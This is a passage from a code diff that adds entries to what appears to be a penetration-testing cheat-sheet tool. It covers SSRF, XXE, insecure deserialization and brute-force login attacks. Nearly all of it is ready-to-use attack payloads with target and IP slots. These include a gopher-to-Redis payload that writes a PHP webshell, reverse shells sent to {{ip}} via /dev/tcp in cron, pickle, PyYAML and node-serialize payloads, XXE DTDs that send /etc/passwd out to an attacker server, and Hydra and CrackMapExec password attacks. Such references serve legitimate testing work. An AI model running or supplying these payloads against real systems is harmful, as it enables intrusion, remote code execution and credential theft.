+      {l:"DigitalOcean",t:"http://169.254.169.254/metadata/v1/\nhttp://169.254.169.254/metadata/v1/id\nhttp://169.254.169.254/metadata/v1/user-data"},
+    ],note:"Cloud metadata gives IAM credentials, user-data scripts, internal IPs."},
+  ]},
+  {section:"SSRF Bypass Techniques",items:[
+    {name:"Filter Bypass",tags:["ssrf","bypass"],cmds:[
+      {l:"URL encoding",t:"http://127.0.0.1 -> http://%31%32%37%2e%30%2e%30%2e%31\nhttp://127.0.0.1 -> http://127.1\nhttp://127.0.0.1 -> http://0"},
+      {l:"Redirect",t:"# Host a redirect on your server:\n# redirect.php: \x3c?php header('Location: http://127.0.0.1:6379'); ?>\nhttp://{{ip}}:{{port}}/redirect.php"},
+      {l:"DNS rebinding",t:"# Use rbndr.us: maps domain to 127.0.0.1\nhttp://YOUR_ID.rbndr.us/\n# Or nip.io:\nhttp://127.0.0.1.nip.io/"},
+      {l:"Enclosed brackets",t:"http://[::ffff:127.0.0.1]\nhttp://[0:0:0:0:0:ffff:127.0.0.1]"},
+      {l:"URL parser confusion",t:"# @ trick: http://expected.com@evil.com\n# Fragment trick: http://evil.com#expected.com\n# Backslash: http://evil.com\\@expected.com\n# Credential: http://127.0.0.1:80%2523@attacker.com/"},
+    ],note:"Use multiple bypass techniques in combination. DNS rebinding most reliable."},
+    {name:"Protocol Smuggling",tags:["ssrf"],cmds:[
+      {l:"File protocol",t:"file:///etc/passwd\nfile:///C:/Windows/win.ini"},
+      {l:"Gopher (Redis)",t:"gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$34%0d%0a\\n\\n\x3c?php system($_GET['cmd']); ?>\\n\\n%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0a"},
+      {l:"Dict protocol",t:"dict://127.0.0.1:6379/INFO\ndict://127.0.0.1:11211/stats"},
+      {l:"Gopher (SMTP)",t:"gopher://127.0.0.1:25/_HELO%20localhost%0d%0aMAIL%20FROM:\x3cattacker@evil.com>%0d%0aRCPT%20TO:\x3cvictim@target.com>%0d%0aDATA%0d%0aSubject:%20SSRF%0d%0a%0d%0aPwned%0d%0a.%0d%0aQUIT"},
+    ],note:"Gopher can interact with Redis/SMTP/MySQL. Most powerful SSRF protocol."},
+  ]},
+  {section:"SSRF to RCE",items:[
+    {name:"SSRF via Redis \x3e Webshell",tags:["ssrf","rce"],cmds:[
+      {l:"Gopherus tool",t:"# Auto-generate gopher payloads:\npython3 gopherus.py --exploit redis\n# Enter: phpshell\n# Enter: \x3c?php system($_GET['cmd']); ?>\n# Paste generated gopher:// URL into SSRF param"},
+      {l:"Redis crontab RCE",t:"gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/spool/cron/%0d%0aCONFIG%20SET%20dbfilename%20root%0d%0aSET%20x%20\"\\n\\n*/1 * * * * bash -i >& /dev/tcp/{{ip}}/{{sport}} 0>&1\\n\\n\"%0d%0aSAVE"},
+    ],note:"Redis SSRF is the most common SSRF-to-RCE path. Use Gopherus for easy payload generation."},
+    {name:"Blind SSRF Detection",tags:["ssrf"],cmds:[
+      {l:"Detect with OOB",t:"# Use Burp Collaborator or interact.sh:\nhttp://BURP_COLLAB_URL\nhttp://YOUR_ID.interact.sh\n\n# Time-based: compare response time for:\nhttp://127.0.0.1:22 (open port - fast/banner)\nhttp://127.0.0.1:1337 (closed port - timeout)"},
+      {l:"Blind port scan",t:"# Iterate ports via SSRF param:\nfor port in 21 22 25 80 443 3306 5432 6379 8080 8443 9200; do\n  curl -s -o /dev/null -w \"%{time_total}\" \"http://{{target}}/fetch?url=http://127.0.0.1:$port\"\ndone\n# Faster response = open port"},
+    ],note:"Blind SSRF gives no response body. Use timing differences or OOB callbacks."},
+    {name:"SSRF via PDF/Image Generators",tags:["ssrf"],cmds:[
+      {l:"HTML to PDF SSRF",t:"# If app converts HTML to PDF (wkhtmltopdf, WeasyPrint):\n\x3ciframe src=\"http://169.254.169.254/latest/meta-data/\">\x3c/iframe>\n\x3cimg src=\"http://169.254.169.254/latest/meta-data/\">\n\x3clink rel=\"stylesheet\" href=\"http://169.254.169.254/\">\n\x3cscript src=\"http://{{ip}}:{{port}}/exfil\">\x3c/script>"},
+      {l:"PDF JS exfil",t:"# wkhtmltopdf with JS enabled:\n\x3cscript>\nx = new XMLHttpRequest();\nx.open('GET','http://169.254.169.254/latest/meta-data/iam/security-credentials/',false);\nx.send();\ndocument.write(x.responseText);\n\x3c/script>"},
+      {l:"Headless browser SSRF",t:"# Puppeteer/Selenium screenshot services:\nhttp://{{target}}/screenshot?url=file:///etc/passwd\nhttp://{{target}}/screenshot?url=http://127.0.0.1:6379"},
+    ],note:"PDF generators and screenshot services often run server-side with SSRF. Check wkhtmltopdf, Puppeteer, PhantomJS."},
+  ]},
+],
+
+// ─── XXE ───
+xxe:[
+  {section:"Basic XXE",items:[
+    {name:"File Read via XXE",tags:["xxe"],cmds:[
+      {l:"Classic file read",t:"\x3c?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\x3c!DOCTYPE foo [\n  \x3c!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n\x3cfoo>&xxe;\x3c/foo>"},
+      {l:"Windows file read",t:"\x3c?xml version=\"1.0\"?>\n\x3c!DOCTYPE foo [\n  \x3c!ENTITY xxe SYSTEM \"file:///C:/Windows/win.ini\">\n]>\n\x3cfoo>&xxe;\x3c/foo>"},
+      {l:"Directory listing (Java)",t:"\x3c?xml version=\"1.0\"?>\n\x3c!DOCTYPE foo [\n  \x3c!ENTITY xxe SYSTEM \"file:///\">\n]>\n\x3cfoo>&xxe;\x3c/foo>\n\n# Java-based XML parsers may list directory contents"},
+      {l:"Source code read (PHP)",t:"\x3c?xml version=\"1.0\"?>\n\x3c!DOCTYPE foo [\n  \x3c!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/var/www/html/config.php\">\n]>\n\x3cfoo>&xxe;\x3c/foo>\n\n# Base64 encode avoids XML parsing errors from special chars"},
+    ],note:"Basic XXE reads files. Use php://filter/base64 for files with special characters."},
+    {name:"SSRF via XXE",tags:["xxe","ssrf"],cmds:[
+      {l:"Internal port scan",t:"\x3c?xml version=\"1.0\"?>\n\x3c!DOCTYPE foo [\n  \x3c!ENTITY xxe SYSTEM \"http://127.0.0.1:22\">\n]>\n\x3cfoo>&xxe;\x3c/foo>\n\n# Different error messages reveal open vs closed ports"},
+      {l:"Cloud metadata",t:"\x3c?xml version=\"1.0\"?>\n\x3c!DOCTYPE foo [\n  \x3c!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">\n]>\n\x3cfoo>&xxe;\x3c/foo>"},
+    ],note:"XXE enables SSRF. Useful when direct SSRF params aren't available."},
+  ]},
+  {section:"Blind XXE (OOB Exfiltration)",items:[
+    {name:"Blind XXE via DTD",tags:["xxe","oob"],cmds:[
+      {l:"External DTD (attacker hosts)",t:"# 1. Host evil.dtd on your server ({{ip}}):\n\x3c!ENTITY % file SYSTEM \"file:///etc/passwd\">\n\x3c!ENTITY % eval \"\x3c!ENTITY &#x25; exfil SYSTEM 'http://{{ip}}:{{port}}/?d=%file;'>\">\n%eval;\n%exfil;\n\n# 2. Send XML payload:\n\x3c?xml version=\"1.0\"?>\n\x3c!DOCTYPE foo [\n  \x3c!ENTITY % xxe SYSTEM \"http://{{ip}}:{{port}}/evil.dtd\">\n  %xxe;\n]>\n\x3cfoo>test\x3c/foo>\n\n# 3. Check your HTTP server logs for exfiltrated data"},
+      {l:"FTP exfil (multiline)",t:"# 1. Start FTP listener: python3 xxeftp.py\n# 2. evil.dtd:\n\x3c!ENTITY % file SYSTEM \"file:///etc/passwd\">\n\x3c!ENTITY % eval \"\x3c!ENTITY &#x25; exfil SYSTEM 'ftp://{{ip}}:2121/%file;'>\">\n%eval;\n%exfil;\n\n# FTP allows multiline data exfil unlike HTTP"},
+    ],note:"Blind XXE: no output shown. Exfiltrate via HTTP/FTP to your server. Use parameter entities (%)."},
+    {name:"Error-Based XXE",tags:["xxe"],cmds:[
+      {l:"Error exfil",t:"# evil.dtd:\n\x3c!ENTITY % file SYSTEM \"file:///etc/passwd\">\n\x3c!ENTITY % eval \"\x3c!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\">\n%eval;\n%error;\n\n# File contents appear in XML parsing error message"},
+    ],note:"If errors are shown, force a file-not-found error with the data in the path."},
+  ]},
+  {section:"XXE via File Upload",items:[
+    {name:"SVG XXE",tags:["xxe","upload"],cmds:[
+      {l:"SVG file read",t:"\x3c?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\x3c!DOCTYPE svg [ \x3c!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n\x3csvg xmlns=\"http://www.w3.org/2000/svg\" width=\"500\" height=\"500\">\n  \x3ctext x=\"0\" y=\"20\" font-size=\"14\">&xxe;\x3c/text>\n\x3c/svg>"},
+      {l:"SVG blind OOB",t:"\x3c?xml version=\"1.0\"?>\n\x3c!DOCTYPE svg [\n  \x3c!ENTITY % xxe SYSTEM \"http://{{ip}}:{{port}}/evil.dtd\">\n  %xxe;\n]>\n\x3csvg xmlns=\"http://www.w3.org/2000/svg\">\x3ctext>XXE\x3c/text>\x3c/svg>"},
+    ],note:"SVG files are XML. Upload as avatar/image to trigger XXE."},
+    {name:"DOCX/XLSX/PPTX XXE",tags:["xxe","upload"],cmds:[
+      {l:"Office document XXE",t:"# Office files are ZIP archives containing XML:\n# 1. Create a normal .docx file\n# 2. Unzip it: unzip document.docx -d doc_xxe/\n# 3. Edit doc_xxe/word/document.xml or [Content_Types].xml\n# 4. Add XXE payload to the XML:\n\x3c?xml version=\"1.0\"?>\n\x3c!DOCTYPE foo [\x3c!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n# 5. Reference &xxe; in the document body\n# 6. Re-zip: cd doc_xxe && zip -r ../evil.docx *"},
+      {l:"Content_Types.xml",t:"# [Content_Types].xml is parsed first:\n\x3c?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\x3c!DOCTYPE foo [\n  \x3c!ENTITY % xxe SYSTEM \"http://{{ip}}:{{port}}/evil.dtd\">\n  %xxe;\n]>\n\x3cTypes xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\">"},
+    ],note:"DOCX/XLSX/PPTX are ZIP files with XML. Modify internal XML files to inject XXE."},
+  ]},
+  {section:"XXE in APIs & Protocols",items:[
+    {name:"XXE in SOAP",tags:["xxe"],cmds:[
+      {l:"SOAP XXE",t:"\x3c?xml version=\"1.0\"?>\n\x3c!DOCTYPE foo [\n  \x3c!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n\x3csoapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  \x3csoapenv:Body>\n    \x3ctest>&xxe;\x3c/test>\n  \x3c/soapenv:Body>\n\x3c/soapenv:Envelope>"},
+    ],note:"SOAP APIs process XML. Test XXE in any SOAP endpoint."},
+    {name:"XXE via Content-Type",tags:["xxe","bypass"],cmds:[
+      {l:"JSON to XML swap",t:"# If API accepts JSON, try changing Content-Type:\n# Original: Content-Type: application/json\n# {\"search\": \"test\"}\n\n# Change to: Content-Type: application/xml\n\x3c?xml version=\"1.0\"?>\n\x3c!DOCTYPE foo [\x3c!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n\x3csearch>&xxe;\x3c/search>"},
+      {l:"XInclude",t:"# When you can't control the full XML doc (e.g., SOAP body):\n\x3cfoo xmlns:xi=\"http://www.w3.org/2001/XInclude\">\n  \x3cxi:include parse=\"text\" href=\"file:///etc/passwd\"/>\n\x3c/foo>"},
+    ],note:"Try Content-Type swap from JSON to XML. XInclude works when you only control part of the XML."},
+    {name:"XXE Filter Bypass",tags:["xxe","bypass"],cmds:[
+      {l:"UTF-16 encoding",t:"# Convert payload to UTF-16 to bypass WAF:\ncat xxe.xml | iconv -f UTF-8 -t UTF-16BE > xxe_utf16.xml\n\n# Also try UTF-7:\n\x3c?xml version=\"1.0\" encoding=\"UTF-7\"?>"},
+      {l:"CDATA wrapper",t:"# Wrap file contents in CDATA to handle special chars:\n\x3c!ENTITY % start \"\x3c![CDATA[\">\n\x3c!ENTITY % file SYSTEM \"file:///etc/passwd\">\n\x3c!ENTITY % end \"]]>\">\n\x3c!ENTITY % dtd SYSTEM \"http://{{ip}}:{{port}}/evil.dtd\">\n%dtd;\n\n# evil.dtd:\n\x3c!ENTITY joined \"%start;%file;%end;\">"},
+      {l:"Parameter entity only",t:"# When regular entities are blocked:\n\x3c?xml version=\"1.0\"?>\n\x3c!DOCTYPE foo [\n  \x3c!ENTITY % xxe SYSTEM \"http://{{ip}}:{{port}}/evil.dtd\">\n  %xxe;\n]>\n\x3cfoo>test\x3c/foo>"},
+    ],note:"WAF bypasses: UTF-16 encoding, parameter entities, XInclude. Try each when basic XXE is blocked."},
+  ]},
+],
+
+// ─── DESERIALIZATION ───
+deser:[
+  {section:"PHP Deserialization",items:[
+    {name:"PHP Object Injection",tags:["php"],cmds:[
+      {l:"Detection",t:"# Look for: unserialize() with user input\n# Cookie values starting with: O:4:\"User\":2:{s:4:\"name\";\n# Base64 decoded session data\n# POST parameters with serialized data"},
+      {l:"Exploit concept",t:"# If class has __destruct() or __wakeup() magic methods:\nO:4:\"Exec\":1:{s:3:\"cmd\";s:2:\"id\";}\n# Serialize in PHP:\n\x3c?php\nclass Exec { public $cmd = 'id'; }\necho serialize(new Exec());\n?>"},
+    ],note:"Find unserialize() calls. Look for dangerous magic methods in source code."},
+    {name:"PHP Phar Deserialization",tags:["php","bypass"],cmds:[
+      {l:"Create phar",t:"\x3c?php\nclass Evil { public $cmd = 'id'; }\n$p = new Phar('evil.phar');\n$p->startBuffering();\n$p->addFromString('test.txt', 'test');\n$p->setStub('\x3c?php __HALT_COMPILER(); ?>');\n$o = new Evil();\n$p->setMetadata($o);\n$p->stopBuffering();\n?>"},
+      {l:"Trigger",t:"# Upload phar as image (rename to .jpg)\n# Trigger via any file operation:\n# file_exists('phar://uploads/evil.jpg')\n# is_file('phar://uploads/evil.jpg')\n# include('phar://uploads/evil.jpg')"},
+    ],note:"Phar deserialization triggers on ANY file operation with phar:// wrapper."},
+  ]},
+  {section:"Java Deserialization",items:[
+    {name:"ysoserial Payloads",tags:["rce"],cmds:[
+      {l:"Generate",t:"java -jar ysoserial.jar CommonsCollections1 'id' > payload.bin\njava -jar ysoserial.jar CommonsCollections5 'bash -c {echo,BASE64_REVSHELL}|{base64,-d}|{bash,-i}' > payload.bin"},
+      {l:"Common gadgets",t:"# Try each gadget chain:\nCommonsCollections1-7\nCommonsCollections10\nCommonsBeanutils1\nSpring1/Spring2\nJdk7u21\nJRMPClient\nHibernate1"},
+      {l:"Detection",t:"# Java serialized data starts with:\n# Hex: AC ED 00 05\n# Base64: rO0AB\n# Look in cookies, POST params, custom headers"},
+    ],note:"ysoserial generates Java deserialization payloads. Try multiple gadget chains."},
+  ]},
+  {section:".NET Deserialization",items:[
+    {name:"ysoserial.net Payloads",tags:["rce"],cmds:[
+      {l:"Generate",t:"ysoserial.exe -g TypeConfuseDelegate -f Json.Net -c 'whoami' -o base64\nysoserial.exe -g ObjectDataProvider -f Json.Net -c 'calc' -o raw"},
+      {l:"ViewState",t:"# If ViewState is not encrypted/MAC'd:\nysoserial.exe -p ViewState -g TypeConfuseDelegate -c 'whoami'"},
+      {l:"Detection",t:"# Look for:\n# __VIEWSTATE parameter (ASP.NET)\n# BinaryFormatter usage\n# Json.Net TypeNameHandling.All\n# Base64 in cookies/params starting with AAEAAAD"},
+    ],note:".NET deserialization. Common in ASP.NET ViewState, JSON APIs, SOAP services."},
+  ]},
+  {section:"Node.js Deserialization",items:[
+    {name:"node-serialize RCE",tags:["rce"],cmds:[
+      {l:"Payload",t:"{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(error,stdout,stderr){console.log(stdout)})}()\"}\n\n# Reverse shell:\n{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/{{ip}}/{{sport}} 0>&1\\\"')}()\"}"},
+      {l:"Detection",t:"# Look for: node-serialize, serialize-javascript\n# Cookie/param with JSON containing functions\n# _$$ND_FUNC$$_ prefix in serialized data"},
+    ],note:"node-serialize is known vulnerable. The _$$ND_FUNC$$_ prefix marks functions."},
+  ]},
+  {section:"Python Deserialization",items:[
+    {name:"Python Pickle RCE",tags:["python","rce"],cmds:[
+      {l:"Generate pickle payload",t:"import pickle, base64, os\n\nclass RCE:\n    def __reduce__(self):\n        return (os.system, ('id',))\n\npayload = base64.b64encode(pickle.dumps(RCE())).decode()\nprint(payload)"},
+      {l:"Reverse shell pickle",t:"import pickle, base64, os\n\nclass RevShell:\n    def __reduce__(self):\n        return (os.system, ('bash -c \"bash -i >& /dev/tcp/{{ip}}/{{sport}} 0>&1\"',))\n\nprint(base64.b64encode(pickle.dumps(RevShell())).decode())"},
+      {l:"Detection",t:"# Look for:\n# pickle.loads() / pickle.load() with user input\n# Base64 decoded data starting with: gASV (protocol 4) or \\x80\\x04\\x95\n# Cookie/session values that are pickled\n# Python frameworks using pickle for session serialization\n# cPickle.loads() in Python 2"},
+    ],note:"pickle.loads() with user input = instant RCE. __reduce__ calls arbitrary functions on deserialization."},
+  ]},
+  {section:"YAML Deserialization",items:[
+    {name:"PyYAML RCE",tags:["python","rce"],cmds:[
+      {l:"Python payload",t:"# PyYAML yaml.load() without SafeLoader:\n!!python/object/apply:os.system ['id']\n\n# Reverse shell:\n!!python/object/apply:subprocess.check_output\n- ['bash', '-c', 'bash -i >& /dev/tcp/{{ip}}/{{sport}} 0>&1']"},
+      {l:"Advanced PyYAML",t:"# Using Popen:\n!!python/object/apply:subprocess.Popen\n- ['bash', '-c', 'id > /tmp/pwned']\n\n# Module import:\n!!python/object/new:os.system ['id']\n\n# Works on PyYAML \x3c 6.0 with yaml.load(data) (no Loader arg)"},
+      {l:"Detection",t:"# Look for:\n# yaml.load() without Loader=SafeLoader\n# yaml.unsafe_load()\n# YAML input in config files, API endpoints, CI/CD pipelines\n# !! tags in YAML data indicate type coercion"},
+    ],note:"PyYAML yaml.load() without SafeLoader allows arbitrary Python object instantiation."},
+    {name:"SnakeYAML (Java) RCE",tags:["java","rce"],cmds:[
+      {l:"Payload",t:"# SnakeYAML processes !!javax.script.ScriptEngineManager:\n!!javax.script.ScriptEngineManager [\n  !!java.net.URLClassLoader [[\n    !!java.net.URL [\"http://{{ip}}:{{port}}/exploit.jar\"]\n  ]]\n]\n\n# Host exploit.jar with malicious ScriptEngineFactory"},
+      {l:"Detection",t:"# Look for:\n# Yaml.load() in Java with SnakeYAML\n# YAML configuration endpoints\n# Spring Cloud Config using YAML\n# !! prefix indicates Java class instantiation"},
+    ],note:"SnakeYAML loads arbitrary Java classes. Host malicious JAR on your server."},
+  ]},
+],
+
+// ─── BRUTE FORCE ───
+brute:[
+  {section:"Hydra - Network Services",items:[
+    {name:"SSH Brute Force",tags:["hydra","ssh"],cmds:[
+      {l:"Single user + wordlist",t:"hydra -l {{user}} -P /usr/share/wordlists/rockyou.txt ssh://{{target}} -t 4 -V"},
+      {l:"User list + pass list",t:"hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://{{target}} -t 4"},
+      {l:"Known creds spray",t:"hydra -C creds.txt ssh://{{target}} -t 4\n\n# creds.txt format (colon-separated):\n# admin:admin\n# root:toor\n# user:password123"},
+      {l:"Custom port",t:"hydra -l {{user}} -P /usr/share/wordlists/rockyou.txt ssh://{{target}} -s 2222 -t 4"},
+    ],note:"SSH rate-limits aggressively. Use -t 4 (4 threads max) to avoid lockouts. -V for verbose output."},
+    {name:"FTP Brute Force",tags:["hydra","ftp"],cmds:[
+      {l:"Basic",t:"hydra -l {{user}} -P /usr/share/wordlists/rockyou.txt ftp://{{target}} -V"},
+      {l:"Anonymous check first",t:"# Always try anonymous login first:\necho -e 'USER anonymous\\nPASS anonymous@\\nQUIT' | nc {{target}} 21\n\n# Then brute:\nhydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://{{target}}"},
+    ],note:"Always try anonymous:anonymous first. FTP sends credentials in plaintext."},
+    {name:"RDP Brute Force",tags:["hydra","rdp"],cmds:[
+      {l:"Basic",t:"hydra -l {{user}} -P /usr/share/wordlists/rockyou.txt rdp://{{target}} -V"},
+      {l:"With domain",t:"hydra -l 'DOMAIN\\\\{{user}}' -P /usr/share/wordlists/rockyou.txt rdp://{{target}}"},
+      {l:"Crowbar (more reliable)",t:"crowbar -b rdp -s {{target}}/32 -u {{user}} -C /usr/share/wordlists/rockyou.txt -n 1"},
+    ],note:"RDP brute is slow. crowbar is more reliable than hydra for RDP. Use -n 1 (1 thread) to avoid NLA issues."},
+    {name:"SMB Brute Force",tags:["hydra","smb"],cmds:[
+      {l:"Hydra",t:"hydra -l {{user}} -P /usr/share/wordlists/rockyou.txt smb://{{target}} -V"},
+      {l:"CrackMapExec",t:"crackmapexec smb {{target}} -u {{user}} -p /usr/share/wordlists/rockyou.txt --continue-on-success"},
+      {l:"User spray",t:"crackmapexec smb {{target}} -u users.txt -p '{{pass}}' --continue-on-success\n\n# Enum users first:\ncrackmapexec smb {{target}} -u '' -p '' --users 2>/dev/null"},
+    ],note:"SMB locks accounts after ~5 failed attempts by default. Use --continue-on-success to find all valid creds."},
+    {name:"MySQL Brute Force",tags:["hydra","mysql"],cmds:[
+      {l:"Basic",t:"hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://{{target}} -V"},
+      {l:"Check default creds first",t:"# Common MySQL defaults:\nmysql -h {{target}} -u root -p'' 2>/dev/null && echo 'ROOT NO PASSWORD!'\nmysql -h {{target}} -u root -proot 2>/dev/null && echo 'root:root'\nmysql -h {{target}} -u admin -padmin 2>/dev/null && echo 'admin:admin'"},
+    ],note:"MySQL root often has no password. Always try empty password first."},
+    {name:"MSSQL Brute Force",tags:["hydra","mssql"],cmds:[
+      {l:"Hydra",t:"hydra -l sa -P /usr/share/wordlists/rockyou.txt mssql://{{target}} -V"},
+      {l:"CrackMapExec",t:"crackmapexec mssql {{target}} -u sa -p /usr/share/wordlists/rockyou.txt"},
+      {l:"Impacket",t:"# Check if sa has default/weak pass:\npython3 /usr/share/doc/python3-impacket/examples/mssqlclient.py sa:{{pass}}@{{target}} -windows-auth"},
+    ],note:"MSSQL 'sa' account is high value - gives xp_cmdshell RCE. Try sa:sa, sa:empty first."},
+    {name:"PostgreSQL Brute Force",tags:["hydra","postgres"],cmds:[
+      {l:"Hydra",t:"hydra -l postgres -P /usr/share/wordlists/rockyou.txt postgres://{{target}} -V"},
+      {l:"Check defaults",t:"# Common PostgreSQL defaults:\npsql -h {{target}} -U postgres -c 'SELECT version();'\n# Default password is often: postgres, empty, or same as username"},
+    ],note:"PostgreSQL default user is 'postgres'. Can lead to RCE via COPY TO/FROM PROGRAM."},
+    {name:"WinRM Brute Force",tags:["winrm"],cmds:[
+      {l:"CrackMapExec",t:"crackmapexec winrm {{target}} -u {{user}} -p /usr/share/wordlists/rockyou.txt"},
+      {l:"User spray",t:"crackmapexec winrm {{target}} -u users.txt -p '{{pass}}'"},
+      {l:"Verify access",t:"# Once creds found:\nevil-winrm -i {{target}} -u {{user}} -p '{{pass}}'"},
+    ],note:"WinRM on port 5985/5986. Valid creds give direct PowerShell access via evil-winrm."},
+    {name:"SNMP Brute (Community Strings)",tags:["snmp"],cmds:[
+      {l:"onesixtyone",t:"onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt {{target}}"},
+      {l:"Hydra",t:"hydra -P /usr/share/seclists/Discovery/SNMP/snmp.txt -v {{target}} snmp"},
+      {l:"After finding string",t:"# Once you find a valid community string:\nsnmpwalk -v2c -c FOUND_STRING {{target}} 1\nsnmpwalk -v2c -c FOUND_STRING {{target}} NET-SNMP-EXTEND-MIB::nsExtendOutputFull"},
+    ],note:"SNMP uses community strings not user:pass. 'public' and 'private' are most common defaults. SNMPv1/v2c sends in cleartext."},
+    {name:"VNC Brute Force",tags:["hydra","vnc"],cmds:[
+      {l:"Hydra (password only)",t:"hydra -P /usr/share/wordlists/rockyou.txt vnc://{{target}} -V\n\n# VNC uses password-only auth (no username)"},
+      {l:"After finding password",t:"vncviewer {{target}}::5900"},
+    ],note:"VNC auth is password-only (no username). Default port 5900. Password max 8 chars in older versions."},
+  ]},
+  {section:"Web Login - Hydra (HTTP)",items:[
+    {name:"HTTP POST Form (Login Page)",tags:["hydra","http"],cmds:[
+      {l:"Step 1: Capture the request",t:"# Use Burp Suite or browser DevTools (Network tab) to capture login POST\n# You need 3 things:\n#   1. The POST URL path (e.g., /login.php)\n#   2. The POST body with field names (e.g., username=admin&password=test)\n#   3. A failure string that appears on bad login (e.g., 'Invalid' or 'incorrect')"},
+      {l:"Step 2: Build hydra command",t:"# Format: http-post-form \"/PATH:BODY:FAIL_STRING\"\n# Use ^USER^ and ^PASS^ as placeholders\n\nhydra -l {{user}} -P /usr/share/wordlists/rockyou.txt {{target}} http-post-form \"/login.php:username=^USER^&password=^PASS^:Invalid credentials\" -V"},
+      {l:"Step 3: With cookie/session",t:"# If login needs a session cookie (CSRF, PHP session, etc.):\n# First grab it:\nCOOKIE=$(curl -s -c - http://{{target}}/login.php | grep -oP 'PHPSESSID=\\S+')\n\nhydra -l {{user}} -P /usr/share/wordlists/rockyou.txt {{target}} http-post-form \"/login.php:username=^USER^&password=^PASS^:Invalid:H=Cookie: $COOKIE\" -V"},
+      {l:"Step 4: With CSRF token",t:"# If form has a CSRF token, you need to extract it per-request.\n# Hydra can't do dynamic CSRF tokens well.\n# Use Burp Intruder (Recursive Grep) or write a script instead:\n\n# Quick Python approach:\npython3 -c \"\nimport requests, sys, re\nurl = 'http://{{target}}/login.php'\nwith open('/usr/share/wordlists/rockyou.txt','r',errors='ignore') as f:\n    for pw in f:\n        pw = pw.strip()\n        s = requests.Session()\n        r = s.get(url)\n        token = re.search(r'name=\\\"token\\\" value=\\\"([^\\\"]+)', r.text)\n        if token:\n            r2 = s.post(url, data={'username':'{{user}}','password':pw,'token':token.group(1)})\n            if 'Invalid' not in r2.text:\n                print(f'FOUND: {{user}}:{pw}'); sys.exit(0)\nprint('Not found')\n\""},
+    ],note:"Hydra http-post-form needs: /path:body_with_^USER^_^PASS^:failure_string. Use Burp to capture the exact POST body. The failure string is text that ONLY appears on failed login."},
+    {name:"HTTP Basic Auth",tags:["hydra","http"],cmds:[
+      {l:"Detect basic auth",t:"# If you see a browser popup or 401 response with:\n# WWW-Authenticate: Basic realm=\"...\"\ncurl -v http://{{target}}/admin/ 2>&1 | grep -i 'www-authenticate'"},
+      {l:"Brute force",t:"hydra -l {{user}} -P /usr/share/wordlists/rockyou.txt {{target}} http-get /admin/ -V"},
+      {l:"With HTTPS",t:"hydra -l {{user}} -P /usr/share/wordlists/rockyou.txt {{target}} https-get /admin/ -V"},
+    ],note:"HTTP Basic Auth sends base64(user:pass) in Authorization header. Use http-get not http-post-form."},
+    {name:"HTTP GET Form",tags:["hydra","http"],cmds:[
+      {l:"When login uses GET params",t:"# Some apps pass creds via URL params:\n# http://target.com/login?user=admin&pass=test\n\nhydra -l {{user}} -P /usr/share/wordlists/rockyou.txt {{target}} http-get-form \"/login:user=^USER^&pass=^PASS^:F=incorrect\" -V"},
+    ],note:"Same syntax as http-post-form but uses GET. Rare but exists in legacy apps."},
+  ]},
+  {section:"Web Login - Specialized Tools",items:[
+    {name:"WFuzz - Web Login Brute",tags:["wfuzz","http"],cmds:[
+      {l:"POST form brute",t:"wfuzz -c -z file,/usr/share/wordlists/rockyou.txt -d 'username={{user}}&password=FUZZ' --hc 302 http://{{target}}/login.php\n\n# --hc 302: hide 302 redirects (success redirects = hide failures)\n# --sc 302: show only 302 (if success = redirect)\n# Adjust based on app behavior"},
+      {l:"With cookie",t:"wfuzz -c -z file,/usr/share/wordlists/rockyou.txt -d 'username={{user}}&password=FUZZ' -b 'PHPSESSID=abc123' --hh 1234 http://{{target}}/login.php\n\n# --hh 1234: hide responses with 1234 chars (failed login page size)\n# First run once to see the failed response size, then filter it"},
+      {l:"Find the right filter",t:"# Step 1: Run ONE request to see the failed response:\ncurl -s -o /dev/null -w 'Status:%{http_code} Size:%{size_download}' -d 'username={{user}}&password=wrongpass' http://{{target}}/login.php\n\n# Step 2: Use that info to filter:\n# If failed = 200 with 5420 bytes -> --hh 5420 (hide that size)\n# If success = 302 redirect -> --sc 302 (show only 302)\n# If failed = specific text -> --hs 'Invalid' (hide string)"},
+    ],note:"WFuzz is flexible. Key is finding the right filter: --hc (hide code), --hh (hide size), --hs (hide string), --sc (show code)."},
+    {name:"ffuf - Web Login Brute",tags:["ffuf","http"],cmds:[
+      {l:"POST form brute",t:"ffuf -u http://{{target}}/login.php -X POST -d 'username={{user}}&password=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -w /usr/share/wordlists/rockyou.txt -fc 200 -v\n\n# -fc 200: filter out 200 (if failed login returns 200)\n# -mc 302: match only 302 (if success = redirect)"},
